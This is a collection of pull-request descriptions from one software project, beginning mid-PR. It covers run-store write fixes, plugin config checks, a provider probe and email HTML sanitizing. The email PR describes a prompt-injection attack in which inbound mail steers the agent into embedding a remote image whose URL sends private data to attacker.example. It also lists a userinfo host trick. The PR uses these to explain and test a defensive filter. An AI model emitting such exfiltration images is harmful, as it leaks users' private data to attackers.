Revert checks, each fix removed on its own from the final head:

| Fix removed | Failing tests |
|---|---|
| The engine stamps its writer id | the 3 `matching_writes_dispatch_the_next_step_once_*` tests and `matching_final_writes_complete_the_run_once`. Nothing else in `sop::` (724 pass) |
| Cancel finished after a refused driver write | `remote_cancel_after_the_final_step_check_is_finished_by_the_driver`, `remote_cancel_after_a_step_check_is_finished_at_the_dispatch_write`, `terminal_write_refused_by_a_finished_run_adopts_its_record`, both `cancel_during_*capability*` tests, and `matching_final_writes_complete_the_run_once`, which needs both fixes. Nothing else in `sop::` (722 pass) |
| Fluent catalog entries | `stale_copy_refusal_renders_from_the_catalog`, plus every test that matches the refusal text (13 in all), because the message then renders as the missing-key marker. That shows the refusal now comes from the catalog |
| Stale check fails closed on a read error (existing behavior; mutation: the read error counts as "current") | `unreadable_stored_record_fails_the_stale_check_closed` only (727 pass) |

Gates on the final head:

```text
cargo fmt --all -- --check                                      # clean
cargo clippy -p zeroclaw-runtime --all-targets -- -D warnings   # clean
cargo test -p zeroclaw-runtime --lib -- sop
test result: ok. 833 passed; 0 failed; 1 ignored; 0 measured; 5012 filtered out
cargo test -p zeroclaw-runtime --lib
test result: FAILED. 5836 passed; 1 failed; 9 ignored; 0 measured; 0 filtered out
```

The one full-lib failure, `rpc::dispatch::tests::rtg_10197_reaped_prompt_publishes_before_close_kill_or_delete_can_remove_it`, is a wall-clock timeout outside `sop/`. It passes alone, both on this head and on the base.

`master` is merged in at `ece3b744e6` (merge commit 9007b40623). None of its 15 commits touch `sop/`.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No

## Compatibility (required)

- Backward compatible? Yes. Records now carry an optional `writer` field. It is omitted when empty, older rows load unchanged, and an older binary ignores it when reading. `revision` still goes up by one per write, and there is no schema change. Two caveats for upgrades, both for the v0.8.7 release notes:
  - **Runs already revived by #10066 will run again after the upgrade.** A run that an older build already revived has `terminal=0` on disk, and nothing distinguishes it from a genuinely active run. The new daemon restores it as active and drives its remaining steps. Cancel such runs before upgrading.
  - **Every process that opens the run store needs the new build.** The terminal guard is code in the new binary, so an older daemon or CLI writing to the same `runs.db` can still reopen a terminal row. Upgrade the daemon and any CLI that runs SOPs together.
- Config / env / CLI surface changed? No
- Rust/MSRV/toolchain floor changed? No

New behaviour to be aware of:

- When two engines race to make the same transition, the second now gets the stale-copy refusal and a `run_copy_stale` event, where it used to succeed as well.
- A new `run_copy_stale` event kind. It is informational, like `step_result_stale`.
- When a stale write is refused at the write itself, after the pre-check passed, transition rows that the stale copy logged just before can precede that event, for example a `step_promoted` row. The event text says those rows were not applied.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <landed-squash-commit>`. Rollback needs no migration: the only on-disk addition is the optional `writer` field, which older binaries ignore.
- **Feature flags or config toggles:** None
- **Observable failure symptoms:**
  - The WARN `refused a transition from an out-of-date copy of the run`, and `run_copy_stale` events, on runs that then stall. That would mean a legitimate writer is being refused.
  - `sop store refused write for run … the run is terminal` in persist-failure logs.
  - Approvals or `sop_advance` failing with `adopted the stored record and did not apply the transition`.
  - Runs cancelled right after a step whose result is missing from the record. This is expected when the cancel was finished after a refused write (#11948).

## Follow-ups

- #11946: a stale deterministic checkpoint copy writes its `{run}.state.json` before its park persist is refused.
- #11947: a schema trigger that refuses `terminal` 1→0. It would also stop older binaries from reopening rows.
- #11944: `run_revisions` entries are not forgotten when a start is rolled back.
- #11945: tests for the stale-copy branches that no test fails on yet (the deterministic park write's stale refusal, the stale arms in the two maintenance park retries, and the rollback paths that keep an adopted record).
- #11948: record the result of the step that ran when a cancel is finished after a refused write.

prs.title: fix(plugins): report the runtime's config refusal in plugin info and list --verify
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - The runtime resolves a tool instance's configuration before it registers the tool, and skips the tool when that fails. A common way to hit this: `plugin remove` keeps the package's `[[plugins.entries]]` row and its values, and a reinstall that declares no `config_schema` then meets values it cannot accept. `plugin info` and `plugin list --verify` only checked that the component instantiates, so they reported `[loads]` for a tool the agent never sees.
  - The runtime's per-instance config check moves, unchanged, out of the host services' resolver closure into `zeroclaw_runtime::tools::resolve_instance_config`: the row under the instance key, the TLS coherence witness, the host-only secret reservation, then `resolve_plugin_config_from`. The resolver calls it for every instance the runtime constructs.
  - The new `zeroclaw_runtime::plugin_runtime::tool_instance_config_verdict` calls the same function, under the scope the activation plan's tool pass builds (`tool_binding_scope`, now shared with that pass). It answers `Accepted`, `Refused` with the row it read, or `NotATool`. So the CLI and the runtime run one function rather than two copies of the rule.
  - For a tool whose component instantiates, `plugin info` and `plugin list --verify` now ask that verdict. A refusal is reported as "does not load", with the runtime's reason and the row that holds the values, and `plugin info` exits non-zero the way it does for a load failure. The WIT instantiation check is unchanged and still runs first. A verdict that cannot be reached is reported as that plugin's load failure, never as an error for the whole command.
  - Quickstart already reports a refused configuration in its readiness lines ("installed, but not usable, because its config entry does not satisfy the plugin's settings schema: <reason>"), so it does not also print a load failure for it.
- **Scope boundary:** The runtime's admission rules and config resolution are unchanged; the resolver now calls the extracted function. `plugin remove` still keeps the row. `plugin install` is unchanged: reporting the same refusal at install, in line with the update-time check added in #11262, is a follow-up. `Loads:` still does not cover every reason the runtime can skip a tool at registration: `plugins.enabled`, `plugins.auto_discover` and the instance ceiling, tool name collisions, a deployment-wide egress refusal, and channel bindings (for which `plugin info` already prints each bound alias's config verdict). A package that requests `config_read` without a `config_schema` is refused when it is admitted, so neither install nor the runtime meets it.
- **Blast radius:** The host services' config resolver (a mechanical extraction; every runtime plugin test runs through it), and `plugin info` and `plugin list --verify` output for tool plugins. A tool whose configuration the runtime refuses, including one whose `config_schema` requires a value that is not set yet, now reports "does not load" and makes `plugin info` exit non-zero. The runtime skips that tool today, so this is the CLI matching it.
- **Linked issue(s):** Partially addresses #11336. Keep #11336 open for install-time warning or refusal when retained configuration conflicts with the installed manifest. Related #11262 has merged; its update path checks preserved config with its own helper. After this PR lands, its tool case can call `tool_instance_config_verdict`.

### What this does, simply

A plugin can pass every CLI check and still be missing from the agent. The usual way: you set a value for a plugin, remove the plugin (its config row and value stay, by design), and install a version that no longer declares any configuration. The runtime refuses to hand that plugin values it cannot validate, so it silently skips the tool, while `plugin info` says `Loads: yes` and `plugin list --verify` says `[loads]`.

Now those commands run the runtime's own config check, the same function the runtime runs. They report that the plugin will not load, say why, and name the config row to fix.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes
- **Interface(s) exercised:** `cli`
- **Setup / preconditions:** A `zeroclaw` build with `--features plugins-wasm-cranelift`, and the tool fixture built for `wasm32-wasip2` (`cargo build --release --target wasm32-wasip2 -p zeroclaw-tool-plugin-fixture` in `crates/zeroclaw-plugins/tests/fixtures/tool-fixture`). Two package directories that hold the component as `tool-fixture.wasm`: one with the manifest from the issue (`permissions = ["config_read"]` and a `config_schema` declaring `label`), one with the same name, `permissions = []` and no `config_schema`. A fresh config directory holding `schema_version = 3`.
- **Steps to run:**
  ```sh
  export ZEROCLAW_CONFIG_DIR=<fresh config dir>
  zeroclaw plugin install <packages>/tool-fixture
  zeroclaw config set --no-interactive plugins.entries.<key printed by plugin info>.config.label masked
  zeroclaw plugin remove tool-fixture
  zeroclaw plugin install <packages>/tool-fixture-no-config-read
  zeroclaw plugin info tool-fixture; echo "exit $?"
  zeroclaw plugin list --verify
  ```
- **Expected on this branch (after):** `plugin info` ends with `Loads: no. The component instantiates against this host's WIT world, but the runtime refuses its configuration: ...` and the row, and exits 1. `plugin list --verify` shows `[does not load: invalid plugin config: plugin 'tool-fixture' has configured values but declares no config_schema]`.
- **Prior behavior on `master` (before):** `plugin info` ends with `Loads: yes.` and exits 0, and `plugin list --verify` shows `[loads]`.

### How I tested

New tests:

- `component::plugin_info_cli::refused_configuration::a_tool_whose_configuration_the_runtime_refuses_does_not_load` (real binary, built tool fixture): the issue's state. `plugin info` exits non-zero and names the refusal and the row; `plugin list --verify` reports it on the row and exits zero; with the value gone the package loads and `plugin info` exits zero. It uses nothing new, so it also runs against `master`, where it fails: `plugin info` prints `Loads: yes.` and exits 0.
- `plugin_runtime::tests::tool_config_verdict_agrees_with_the_runtime_config_resolver`: for seven row sets (values on a schemaless package, an empty map, no row, valid and invalid values for a schema, and duplicate rows), the verdict gives the answer, message and row of the resolver the runtime constructs tools with. It also pins `NotATool` for a channel-only package, and that a package requesting `config_read` without a schema is never admitted.
- `tests::plugin_load_check::values_left_for_a_reinstall_without_a_config_schema_do_not_load` (`--bin zeroclaw`, real fixture): install with a schema, set a value, remove, reinstall without a schema. Info and the verified list report the refusal with the row, and removing the values makes it load again. Before the remove, the package with a schema loads with its value.
- `tests::plugin_load_check::a_package_requesting_config_read_without_a_schema_is_refused_at_install`.
- `quickstart_plugins::tests::a_refused_configuration_is_not_reported_as_a_load_failure`: the readiness lines report the refusal with the resolver's reason, and no load-failure line is added.
- `i18n::tests::plugin_load_verdict_cli_strings_are_translated_in_every_locale` covers the new key in all five locales.

Revert checks. Each behavioural change below, undone on its own, makes its test fail, and restoring it brings the file back byte for byte (sha256 checked). The mapping of a verdict error to the plugin's own load failure has no test: an admitted manifest always forms its instance key, so the error cannot be produced.

- the verdict in `installed_plugin_load_status`: `the runtime skips this tool, so it must not report as loading: Loads`;
- the runtime verdict made to accept every refusal: `schemaless [{"label": "masked"}]: verdict Accepted, runtime Err(InvalidConfig("plugin 'schemaless' has configured values but declares no config_schema"))`;
- quickstart's handling of a refused configuration: it then also prints `tool-fixture: installed, but it does not load against this host ...`.

The extraction in `tools/mod.rs` moves the resolver's body unchanged; the full runtime library, which drives every plugin instance through that resolver, passes.

- **CI checks relied on and why they cover this change:** The `plugins cranelift runtime` leg runs `cargo test --features plugins-wasm-cranelift --bin zeroclaw`, the `plugin_info_cli` component tests, the runtime `plugin_runtime::` admission tests and the root plugin e2e targets. `Lint` covers Clippy, rustdoc and comment hygiene; `Docs Style` covers the changed Markdown.
- **Known CI coverage gap, if any:** None known.
- **Commands run and tail output:** 
  ```text
  cargo fmt --all -- --check                                                    # exit 0
  cargo clippy --locked -p zeroclaw-runtime --all-targets --features plugins-wasm-cranelift -- -D warnings   # exit 0
  cargo clippy --locked -p zeroclaw --all-targets --features ci-all -- -D warnings                           # exit 0
  cargo clippy --locked -p zeroclaw --all-targets -- -D warnings                                             # exit 0
  cargo test --locked -p zeroclaw-runtime --features plugins-wasm-cranelift --lib
  test result: ok. 5838 passed; 0 failed; 8 ignored; 0 measured; 0 filtered out; finished in 408.85s
  cargo test --locked --features plugins-wasm-cranelift --test plugin_channel_runtime_e2e --test channel_egress_e2e --test channel_websocket_e2e
  3 targets ok: 19 passed, 0 failed
  cargo test --locked --features plugins-wasm-cranelift --bin zeroclaw
  test result: ok. 762 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 44.59s
  cargo test --locked --features plugins-wasm-cranelift --test component -- plugin_info_cli
  test result: ok. 5 passed; 0 failed; 0 ignored; 0 measured; 263 filtered out; finished in 33.72s
  bash scripts/ci/comment_hygiene_gate.sh <changed .rs files>                  # exit 0
  DOCS_FILES=docs/book/src/plugins/index.md bash scripts/ci/docs_quality_gate.sh  # full-file lint, 0 errors
  DOCS_FILES=docs/book/src/plugins/index.md bash scripts/ci/docs_links_gate.sh    # exit 0
  ```

  Linux x86_64, Rust 1.98.0, `umask 022`. Under a group-writable umask, `alias_cli::tests::agent_mutation_fails_closed_when_owner_has_no_rpc_endpoint` refuses its temp directory as mode 775; neither that test nor the code it exercises is touched here.
- **Beyond CI, what did you manually verify?** The issue's CLI sequence with a `master` binary and with this branch's binary, both built with `--features plugins-wasm-cranelift`, against the same fixture component (output below). `--bin zeroclaw` also passes with this change and the `plugin remove` fix for #11357 applied together (762 passed). Not verified: the agent turn from the issue (it needs a scripted provider), and Windows or macOS runs.
- **Visual interface evidence:** `Exact plain-text output`, with local paths replaced by `<packages>` and `<config-dir>`
- **Tested revision, interface, and evidence path:** `cli`, locale `en_US.UTF-8`, output not width-dependent. Base `master` 4e82ce46e9 plus this patch.
- **Screenshot or exact-output evidence:** 

  On this branch:

  ```text
  $ zeroclaw plugin install <packages>/tool-fixture
  Seeded [[plugins.entries]] for 'zpi1_WyJ0b29sLWZpeHR1cmUiLCJ0b29sIiwidG9vbC1maXh0dXJlIl0'. Set plugin config values with `zeroclaw config set plugins.entries.zpi1_WyJ0b29sLWZpeHR1cmUiLCJ0b29sIiwidG9vbC1maXh0dXJlIl0.config.<key>`.
  Plugin installed from <packages>/tool-fixture

  plugins.entries.zpi1_WyJ0b29sLWZpeHR1cmUiLCJ0b29sIiwidG9vbC1maXh0dXJlIl0.config.label updated.
  [exit 0]
  $ zeroclaw plugin remove tool-fixture
  Plugin 'tool-fixture' removed.

  $ zeroclaw plugin install <packages>/tool-fixture-no-config-read

  [exit 0]
  $ zeroclaw plugin info tool-fixture
  Plugin: tool-fixture v0.0.0
  Capabilities: [Tool]
  Permissions: []
  WASM: <config-dir>/plugins/tool-fixture/tool-fixture.wasm
  Loads: no. The component instantiates against this host's WIT world, but the runtime refuses its configuration: invalid plugin config: plugin 'tool-fixture' has configured values but declares no config_schema
  The configuration is the `config` map of the [[plugins.entries]] row named 'zpi1_WyJ0b29sLWZpeHR1cmUiLCJ0b29sIiwidG9vbC1maXh0dXJlIl0'. Make it match the installed package's config_schema, or remove its values if the package declares none.
  ```

  On `master` (the same steps):

- **If any command was intentionally skipped, why:** The agent-turn half of the issue's repro (provider-side proof that the tool is not offered) was not rerun. The runtime test instead compares the verdict with the runtime's own resolver case by case, and both call one function.

prs.title: fix(tools): probe the saved provider alias after a model-routing update
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - Build the post-save provider probe from the alias in the effective reloaded configuration, including decryption and the normal environment-override precedence for credentials, endpoint, runtime options, and model.
  - Enter the probe from the post-save alias boundary even when the disk entry has no model, so a supported environment-only model override cannot bypass validation.
  - Select the probed model from the effective configuration alone and stop before dispatch when it resolves none, so an environment override that explicitly clears the alias model (an empty `ZEROCLAW_*__model` value) can never be replaced by the saved model the reloaded runtime will not serve.
  - Select the alias credential only from the effective reloaded configuration. Missing, empty, or whitespace-only credentials take the existing no-credential skip. Removing a saved key or a current environment credential cannot revive a key from the startup snapshot; current environment-only credentials still reach the probe without being persisted.
  - Treat provider-construction and environment-override reconstruction failures as unsuccessful tool results instead of passing them through the chat-error retry heuristic; keep the intentional secrets-decryption compatibility skip distinct.
  - Sanitize probe failures before returning or logging them, name the effective model the probe actually validated in those diagnostics, and roll back atomically after a fatal probe by restoring an updated alias's prior entry or removing a newly created alias before persisting.
  - Move effective-config reconstruction, including secret resolution, into a blocking worker so the post-save probe does not block a Tokio worker thread.
- **Scope boundary:** This does not change provider request behavior, the existing request-error retry classification, model-routing configuration syntax, or environment-override precedence. A secrets-decryption failure still skips the probe; making that compatibility path separately observable remains outside this PR. An alias whose effective model or effective credential is absent (never set, removed from saved configuration or the environment, or explicitly cleared by the environment) is still saved with the probe skipped, as before; rejecting such an update is a separate policy decision.
- **Blast radius:** The `model_routing_config` tool's post-save validation, error reporting, and rollback path only. Operators with invalid aliases or malformed effective overrides now receive a sanitized validation failure that was previously reported as success.
- **Linked issue(s):** Closes #9592. Related #8858.
- **Labels:** `bug`, `tool`, `distinguished contributor`, `risk:medium`, `size:XL`, `domain:security`

## Current exact-head validation (2026-09-30)

- **Head:** `bf21f5cc08e8ce92efb0d13cfcf6fa239b360124`
- **Repair since `ec7d374ac51418b04b3bae5fc52c201b28312a2f`:** One commit, `fix(tools): honor removed probe credentials`, removes startup-snapshot credential fallback and updates the affected tests. The aggregate change remains confined to `crates/zeroclaw-tools/src/model_routing_config.rs`.
- **Required CI:** [`CI Required Gate` passed on this head](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/36604152566/job/109534960557). The advisory Windows job was skipped on this head; the Windows results below belong to the historical September 10 head.
- **Repair coverage:** The saved-key-removal test constructs a tool with a key, removes it through `upsert_agent` with `api_key: null`, then calls `set_default` on the same tool. It asserts zero provider requests and checks that the key remains absent while the model and temperature update persist. The current environment-only credential test matches the request's Authorization header, requires one request, and checks that the environment key stays off disk. Startup-only credentials now take the no-credential skip; construction-failure coverage uses a current environment credential.
- **Review validation:** I inspected the repair and its regression assertions and checked hosted CI. I did not rerun local Cargo commands or make a live-provider request for this head. The local outputs below are historical evidence.

## Historical validation record

> The records below predate the current head. Their commands and results apply only to the named historical revisions. The September 29 repair supersedes the earlier startup-credential fallback behavior and its positive control.

### Head `ec7d374ac51418b04b3bae5fc52c201b28312a2f` (2026-09-10)

- **Head:** `ec7d374ac51418b04b3bae5fc52c201b28312a2f`
- **Base integrated:** `origin/master` at `46479bdca74bedb5c71e30afab657ccaac77dab4` (clean merge; master did not touch `model_routing_config.rs`, and the aggregate base-to-head patch is still that one file)
- **Delta since the reviewed head `fbabd89b7c81532654ca939dc74ab370fab12314`:** one `master` merge and two commits. The functional commit answers the 2026-09-09 zeroclaw-reviewer blocker on the explicitly cleared API-key override; the second is the rustfmt fixup for one assertion in the new test. `crates/zeroclaw-tools/src/model_routing_config.rs:855-858` now records the alias credential path and keeps `None` when that path is environment-owned, so the runtime-snapshot fallback applies only to a genuinely unoverridden path.
- **Required CI:**
  - Hosted CI on this head (`ec7d374ac51418b04b3bae5fc52c201b28312a2f`): `CI Required Gate` SUCCESS, run 34553249805. `Advisory Windows nextest (scoped, plugin-host=false)` failed (non-required); its actual test results are summarized below.
  - Historical: `CI Required Gate` passed on the previous exact head `fbabd89b7c81532654ca939dc74ab370fab12314` in [run 34181632115](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/34181632115).
  - The [non-required Windows job](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/34553249805/job/103125841193) ran 9,422 tests: 9,418 passed, four failed, and 16 were skipped. The failures were the `../../web/dist` packaging assertion, `process_line_session_new_creates_session_on_two_megabyte_stack` (stack overflow), and the two PowerShell pipeline tests in `tools::shell` and `tools::skill_tool` (60-second timeouts). These failures are outside the changed model-routing path. Both explicit-clear regressions, the retained-key control, and the effective-model diagnostic and composed rollback tests passed in this job.
- **Local validation on this exact head:**

```text
cargo fmt --all --check
  clean

bash scripts/ci/comment_hygiene_gate.sh
  Comment hygiene gate passed.

./scripts/ci/rust_quality_gate.sh --strict
  fmt clean
  cargo clippy --locked --workspace --exclude zeroclaw-desktop --all-targets --features ci-all -- -D warnings
    Finished `dev` profile, no Clippy diagnostics

  Summary [0.479s] 24 tests run: 24 passed, 1716 skipped

  Summary [76.282s] 15614 tests run: 15613 passed (5 leaky), 1 failed, 24 skipped
  FAIL zeroclaw-providers grok_cli::tests::unix_fake_child::timeout_kills_leader_and_descendant
```

  The single workspace failure is the known local-only macOS process-kill race in `grok_cli`. It cannot see this change: `git diff origin/master HEAD -- crates/zeroclaw-providers` is empty on this head, and `zeroclaw-providers` does not depend on `zeroclaw-tools`. It also reproduces serially on this machine (`cargo nextest run --locked -p zeroclaw-providers --test-threads=1 -E 'test(timeout_kills_leader_and_descendant)'` fails at 2.02s, the wall-clock boundary the test asserts), so I am reporting it rather than claiming a pass. Hosted CI is the authority for that crate.

  Fail-before/pass-after evidence for the credential fix, produced by deleting the `None if effective.prop_is_env_overridden(&api_key_path) => None` arm on the working tree, running the model-routing suite, then restoring the tracked file and rerunning:

```text
before (guard arm removed)
  Summary [0.727s] 24 tests run: 22 passed, 2 failed, 1706 skipped
  FAIL probe_model_keeps_an_explicitly_cleared_credential_clear
  FAIL set_default_does_not_probe_with_the_snapshot_key_after_an_explicit_empty_override
    the boot snapshot credential must not be probed once the environment cleared the
    effective one; got 1 request(s)

after (tracked file restored)

```

  The third new case, `set_default_still_probes_with_the_snapshot_key_when_the_path_is_not_overridden`, passes in both directions by design: it pins the unoverridden fallback so the new guard cannot swallow it. Docs gates were not run because the aggregate base-to-head patch touches no file under `docs/`.

- **Remaining external/non-blocking gaps:** No live probe against a paid provider; every request-level assertion runs against Wiremock. The explicit-empty regressions set process environment variables to the empty string. They passed locally on macOS and in the exact-head Windows job above, closing the empty-value platform uncertainty despite that job's unrelated failures. The retryable-failure log record carries the effective model, but no test asserts the log attribute. When the environment layer itself cannot be rebuilt, the fatal message still names the saved model because no effective model exists at that point. The workspace `grok_cli` timeout test could not be made to pass on this machine and is reported as failing above.
- **Visual evidence:** N/A; no rendered interface changed.

### Head `fbabd89b7c81532654ca939dc74ab370fab12314` (2026-09-08)

- Base integrated: `origin/master` at `ab72fe5d7fd0c1ab8e9cbc226c2b783eb4914332` (clean merge; the aggregate base-to-head patch was already confined to `model_routing_config.rs`).
- Required CI: [`CI Required Gate` run 34181632115](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/34181632115) passed at that head.
- That head answered the 2026-09-04 and 2026-09-07 reviews: the explicit-empty *model* override, effective-model diagnostics, a two-string message cleanup, the composed unavailable-model regression, and narrowing effective-model selection to the effective configuration alone. Each production fix carried an outer-boundary `set_default` regression that failed when the pre-fix expression was restored and passed with the fix.
- Local gate set on that head: `cargo fmt --all --check` clean, `bash scripts/ci/comment_hygiene_gate.sh` passed, `./scripts/ci/rust_quality_gate.sh --strict` passed, both `cargo check` variants finished, `cargo nextest run --locked -p zeroclaw-tools` 1727 passed, and the full workspace run reported 15455 passed with 4 load-sensitive failures that all passed when rerun serially.

### Head `969ff52f239703cc1ddb15bd3dfa1e043bb96fbe` (2026-08-30)

- Base integrated: `origin/master` at `559c543a0fe8ee47418345e1a87ce77dfbb39177`.
- Required CI: [Quality Gate run 33294368004](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/33294368004) passed at that head; every check context was complete with no failures.
- Carried-forward focused validation: eighteen model-routing tests passed in ten consecutive normal parallel runs, all 18 passed with all features, and strict Clippy passed on the prior reviewed implementation.

### Head `a7fda8c7a476981c302ed1895a8ed950649ffc7e` (test-isolation repair)

- Hosted CI was green on that exact head; the repair delta was confined to shared test locking and panic-safe environment restoration in the model-routing test module.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** `N/A` — deterministic config, construction, wiremock dispatch, sanitization, persisted rollback, and test-isolation coverage exercise the boundary without a live provider credential.

### How I tested

The current-head review relies on hosted CI and inspection of the repaired request and persistence assertions. Local command outputs above belong to their named historical heads.

- `set_default_does_not_probe_after_upsert_agent_removes_the_saved_key` covers saved-key removal after tool construction, zero dispatched requests, and persistence of the key-free update.
- `set_default_probes_with_current_environment_only_credentials` covers a credential introduced through the environment after tool construction, the exact Authorization header, one dispatched request, and no credential persistence.
- Retained explicit-empty model and credential tests cover environment clears. The former snapshot-fallback positive control now requires a skip when the current effective configuration has no key.

The focused implementation suite was first tested locally at `7590d14f051cfbfd706cdd06d01019980ab8d50a`, covering updated and newly created aliases, credential/endpoint/runtime-option/model precedence, the environment-only model entry point, reconstruction and construction error classification, returned-error sanitization, and persisted rollback.

- **CI checks relied on and why they cover this change:** The required hosted gate covers repository policy, the broader workspace/platform matrix, and the default-parallel test boundary. The historical focused local tests and strict workspace lint exercised the earlier tool/config/provider behavior; they were not rerun locally for this repair.
- **Known CI coverage gap, if any:** No successful live-provider request was made because it would require a real credential and network dependency. The Wiremock tests inspect the actual dispatched request without external traffic. A secrets-decryption failure remains an intentional non-fatal skip and is not separately surfaced. The historical local macOS `grok_cli` failure is recorded above; it was not rerun for this head.
- **Commands run and tail output:** Historical outputs are included above with their revisions; current-head hosted CI is linked separately.
- **Beyond CI, what did you manually verify?** Traced `set_default` from its persisted write through decryption, full environment overrides, alias-aware provider construction, effective-credential and effective-model selection (including both explicit-clear branches), sanitized failure output, and persisted rollback. Inspected the outer-boundary assertions for saved-key removal and current environment-only credentials, including request counts, the Authorization header, and persisted configuration.
- **Visual interface changed?** `N/A` — no rendered text, layout, or interaction changed.
- **If any command was intentionally skipped, why:** The docs gates were not run because no file under `docs/` changed.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? `No`
- New external network calls? `Yes` — the existing post-save alias probe is now also reached when the effective model comes only from a supported environment override. This adds no new destination class or request shape; it uses the effective alias endpoint and credentials, and failures are sanitized before operator output or logging. An absent effective model or credential, including a removed saved key or an explicit environment clear, results in no request at all.
- Secrets / tokens / credentials handling changed? `Yes`
- PII, real identities, or personal data in diff, tests, fixtures, or docs? `No`
- Prompt injection or untrusted model-visible text introduced/changed? `No`
- If any `Yes`, describe the risk and mitigation: The probe clones the private saved configuration and transfers that owned clone to a blocking worker for decryption and environment overrides. The clone is not persisted, and probe failure text is passed through the existing provider error sanitizer before it reaches tool output, `ToolResult.error`, or logs. The credential fix narrows what the probe may send: an absent effective credential is never repopulated from the startup snapshot, whether it was removed from saved configuration, removed from the environment, or explicitly cleared.

## Compatibility (required)

- Backward compatible? `Yes` — invalid provider aliases and malformed effective overrides now fail and roll back instead of being silently accepted.
- Config / env / CLI surface changed? `No`
- Rust/MSRV/toolchain floor changed? `No`

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** After merge, revert the landed PR commit with `git revert <landed-pr-commit-sha>`.
- **Feature flags or config toggles:** None.
- **Observable failure symptoms:** `model_routing_config` reports a sanitized probe failure for a valid effective alias, fails to send the environment-effective model, dispatches a saved model after an environment clear or a stale snapshot credential after credential removal or clearing, uses an unexpected endpoint/runtime option, or fails to restore/remove the alias after a rejected update. Check tool failure logs for `model_routing_config` and rerun the focused `model_routing_config` suite.

prs.title: fix(channels/email): build the HTML part from Markdown structure only
prs.body:
## Summary - **Base branch:** `master` - **What changed and why:** - The email channel's HTML part is built from Markdown structure only. `markdown_to_html` now filters `pulldown-cmark`'s events before rendering: - Raw inline HTML is dropped, keeping the text between tags; `
` becomes a line break. - A raw HTML block is rendered as text. - An image is kept only for an inline attachment (`cid:`) or an `https` URL whose host is on the channel's new `html_image_domains`, which also covers subdomains. Any other image is reduced to its alt text. - A link is kept only for `http`, `https`, `mailto` and `tel`. Any other target is reduced to the link text. - Why: the agent's text can be steered by the mail it answers, and until now raw HTML and arbitrary image URLs went into the HTML part unchanged. A remote image is fetched by the reader's mail client, so an injected `![](https://attacker.example/p.png?d=...)` or `` was a way to send data out. - **Scope boundary:** - The plain-text part is unchanged (the agent's text as written; mail clients fetch nothing from it). - Inbound handling is unchanged. - No new dependency: the filter runs on the parser's event stream, and `push_html` still does the escaping. - Agent-written HTML bodies and operator templates are proposed separately in #11992. - **Blast radius:** the HTML part of every message the IMAP+SMTP email channel sends. Markdown output (headings, emphasis, lists, tables, code, safe links) is unchanged. What changes is raw HTML in the agent's text and images from unlisted hosts. - **Linked issue(s):** Closes #11991. Related #11992 ### What this does, simply When the assistant replies by email, its text is turned into a formatted email. Until now, any HTML or image link in that text went out as-is. If someone tricked the assistant with an email, they could make it add an invisible image whose web address carries private information, and the reader's mail program would send it to them when loading the image. Now only formatting comes through. Images are allowed only if they're attached to the email or hosted on sites the operator lists, and odd links are reduced to plain text. ## Testing (required) ### How you can test (when useful) - **Reviewer testing requested?** N/A. The unit tests cover each rule, plus one sent message end to end. ### How I tested - **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change. - **Known CI coverage gap, if any:** `markdownlint-cli2` can't run on my machine (no Node); CI's docs job covers it. - **Commands run and tail output:** ```text cargo fmt --all -- --check ok cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions test result: ok. 1 passed; 0 failed cargo test -p zeroclaw-channels --lib -- email_channel test result: ok. 80 passed; 0 failed cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings ok RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config ok bash scripts/ci/comment_hygiene_gate.sh passed ``` - **Beyond CI, what did you manually verify?** New tests: - raw inline HTML dropped with its text kept - `
` becomes a line break - a raw HTML block shown as text - remote images reduced to alt text: an unlisted host, `http` on a listed host, a look-alike host, a userinfo trick (`https://listed@attacker/`) and `data:` - listed hosts, their subdomains and `cid:` kept; no list means `cid:` only - `javascript:` links reduced to text while `https` links stay - tables and emphasis still render - a sent message carries no `` in its HTML part Negative check: with the previous `markdown_to_html` restored, 7 of the 8 new tests fail. The eighth, tables and emphasis, passes both ways, since that behaviour doesn't change. Not verified: a live send on this branch. - **Visual interface evidence:** N/A (mail HTML structure; the tests assert the rendered markup). ## Security & Privacy Impact (required) - New permissions, capabilities, or file system access scope? No - New external network calls? No. This removes a path by which outbound mail made the reader's client fetch arbitrary URLs. - Secrets / tokens / credentials handling changed? No - PII, real identities, or personal data in diff, tests, fixtures, or docs? No - Prompt injection or untrusted model-visible text introduced/changed? No. This limits what model-written text can put in outbound HTML. ## Compatibility (required) - Backward compatible? Mostly. Markdown renders as before. Raw HTML in the agent's text is no longer sent as markup, and remote images need their host on `html_image_domains`. - Config / env / CLI surface changed? Yes: one optional key, `html_image_domains` on `[channels.email.]`, empty by default. - Rust/MSRV/toolchain floor changed? No ## Rollback (required for medium/high-risk PRs) Low risk: `git revert `. - **Observable failure symptoms:** an expected image showing as its alt text means its host is not on `html_image_domains`.

prs.title: feat(runtime): add durable task lifecycle foundation for Goal Mode [Goal V1 proposal 1/12]
prs.body:
## Summary

> **V1 foundation proposal 1/12.** This supplies task/storage contracts, not a complete Goal feature or a request to merge. The local full-workspace Cargo test remains failed, including seven failure signatures whose cause is unresolved. Executed CI product checks passed, but required CI is not green: Windows selection timed out during setup and its dependent Windows coverage remains open.

